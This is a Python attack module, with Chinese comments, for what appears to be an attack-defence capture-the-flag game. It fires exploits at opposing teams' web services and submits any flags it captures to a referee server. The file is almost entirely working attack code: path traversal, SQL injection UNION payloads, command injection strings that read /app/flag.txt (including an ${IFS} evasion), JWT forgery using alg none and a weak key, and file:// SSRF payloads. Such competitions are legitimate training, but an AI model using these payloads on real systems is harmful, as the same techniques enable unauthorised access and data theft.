"""攻击模块 — 执行真实 exploit 脚本"""

import os
import json
import base64
import hashlib
import logging
import httpx

logger = logging.getLogger("lobster.attacker")

REFEREE_URL = os.environ.get("REFEREE_URL", "http://referee:8000")
LOBSTER_ID = int(os.environ.get("LOBSTER_ID", "0"))


def exploit_path_traversal(target_host: str) -> dict:
    """路径遍历攻击"""
    url = f"http://{target_host}:5000/files?name=../../flag.txt"
    try:
        resp = httpx.get(url, timeout=10)
        text = resp.text
        if "FLAG{" in text:
            # 提取 flag
            import re
            match = re.search(r'FLAG\{[^}]+\}', text)
            if match:
                return {"success": True, "flag": match.group(0), "method": "path_traversal"}
        return {"success": False, "reason": "No flag in response", "status": resp.status_code}
    except Exception as e:
        return {"success": False, "reason": str(e)}


def exploit_sql_injection(target_host: str) -> dict:
    """SQL 注入攻击"""
    payloads = [
        "' UNION SELECT 1,flag,1 FROM secrets--",
        "' UNION SELECT 1,flag,'x' FROM secrets--",
        "' UNION ALL SELECT 1,flag,1 FROM secrets--",
    ]
    for payload in payloads:
        url = f"http://{target_host}:5000/search?q={payload}"
        try:
            resp = httpx.get(url, timeout=10)
            text = resp.text
            if "FLAG{" in text:
                import re
                match = re.search(r'FLAG\{[^}]+\}', text)
                if match:
                    return {"success": True, "flag": match.group(0), "method": "sql_injection"}
        except:
            continue
    return {"success": False, "reason": "SQL injection failed"}


def exploit_command_injection(target_host: str) -> dict:
    """命令注入攻击"""
    payloads = [
        ";cat /app/flag.txt",
        "$(cat /app/flag.txt)",
        "|cat /app/flag.txt",
        ";cat${IFS}/app/flag.txt",
    ]
    for payload in payloads:
        url = f"http://{target_host}:5000/ping?host={payload}"
        try:
            resp = httpx.get(url, timeout=10)
            text = resp.text
            if "FLAG{" in text:
                import re
                match = re.search(r'FLAG\{[^}]+\}', text)
                if match:
                    return {"success": True, "flag": match.group(0), "method": "command_injection"}
        except:
            continue
    return {"success": False, "reason": "Command injection failed"}


def exploit_auth_bypass(target_host: str) -> dict:
    """认证绕过攻击"""
    # 方法1: none 算法
    header = base64.b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).decode().rstrip('=')
    payload = base64.b64encode(json.dumps({"user": "hacker", "role": "admin"}).encode()).decode().rstrip('=')
    token = f"{header}.{payload}."
    
    try:
        resp = httpx.get(f"http://{target_host}:5000/admin", 
                        cookies={"auth_token": token}, timeout=10)
        text = resp.text
        if "FLAG{" in text:
            import re
            match = re.search(r'FLAG\{[^}]+\}', text)
            if match:
                return {"success": True, "flag": match.group(0), "method": "auth_bypass_none"}
    except:
        pass

    # 方法2: 弱密钥 "lobster"
    header = base64.b64encode(json.dumps({"alg": "HS256", "typ": "JWT"}).encode()).decode().rstrip('=')
    payload = base64.b64encode(json.dumps({"user": "admin", "role": "admin"}).encode()).decode().rstrip('=')
    sig = hashlib.sha256(f"{header}.{payload}lobster".encode()).hexdigest()[:16]
    token = f"{header}.{payload}.{sig}"
    
    try:
        resp = httpx.get(f"http://{target_host}:5000/admin",
                        cookies={"auth_token": token}, timeout=10)
        text = resp.text
        if "FLAG{" in text:
            import re
            match = re.search(r'FLAG\{[^}]+\}', text)
            if match:
                return {"success": True, "flag": match.group(0), "method": "auth_bypass_weak_key"}
    except:
        pass

    return {"success": False, "reason": "Auth bypass failed"}


def exploit_ssrf(target_host: str) -> dict:
    """SSRF 攻击"""
    payloads = [
        "file:///app/flag.txt",
        "file:///app/data/../flag.txt",
    ]
    for payload in payloads:
        url = f"http://{target_host}:5000/fetch?url={payload}"
        try:
            resp = httpx.get(url, timeout=10)
            text = resp.text
            if "FLAG{" in text:
                import re
                match = re.search(r'FLAG\{[^}]+\}', text)
                if match:
                    return {"success": True, "flag": match.group(0), "method": "ssrf"}
        except:
            continue
    return {"success": False, "reason": "SSRF failed"}


def scout_target(target_host: str) -> dict:
    """侦察目标漏洞状态"""
    results = {}
    
    # 检查健康状态
    try:
        resp = httpx.get(f"http://{target_host}:5000/health", timeout=5)
        health = resp.json()
        results["patched"] = health.get("patched", [])
        results["online"] = True
    except:
        results["online"] = False
        results["patched"] = []

    return results


# 攻击函数映射
EXPLOIT_MAP = {
    "path_traversal": exploit_path_traversal,
    "sql_injection": exploit_sql_injection,
    "command_injection": exploit_command_injection,
    "auth_bypass": exploit_auth_bypass,
    "ssrf": exploit_ssrf,
}


async def execute_attack(target_hostname: str, target_id: int, vulnerability: str) -> dict:
    """执行攻击并提交 flag 给裁判"""
    if vulnerability not in EXPLOIT_MAP:
        return {"ok": False, "message": f"Unknown vulnerability: {vulnerability}"}
    
    logger.info(f"⚔️ 攻击 {target_hostname} 的 {vulnerability}...")
    
    # 执行 exploit
    result = EXPLOIT_MAP[vulnerability](target_hostname)
    
    if result.get("success") and result.get("flag"):
        # 提交 flag 给裁判
        logger.info(f"🏴 拿到 flag: {result['flag'][:20]}... 提交中...")
        async with httpx.AsyncClient(timeout=10) as client:
            resp = await client.post(f"{REFEREE_URL}/submit_flag", json={
                "attacker_id": LOBSTER_ID,
                "target_id": target_id,
                "flag": result["flag"],
                "vulnerability": vulnerability,
            })
            submit_result = resp.json()
            logger.info(f"📤 提交结果: {submit_result}")
            return submit_result
    else:
        logger.info(f"❌ 攻击失败: {result.get('reason', 'unknown')}")
        # 通知裁判攻击失败（用于日志）
        async with httpx.AsyncClient(timeout=10) as client:
            await client.post(f"{REFEREE_URL}/attack_failed", json={
                "attacker_id": LOBSTER_ID,
                "target_id": target_id,
                "vulnerability": vulnerability,
                "reason": result.get("reason", ""),
            })
        return {"ok": False, **result}
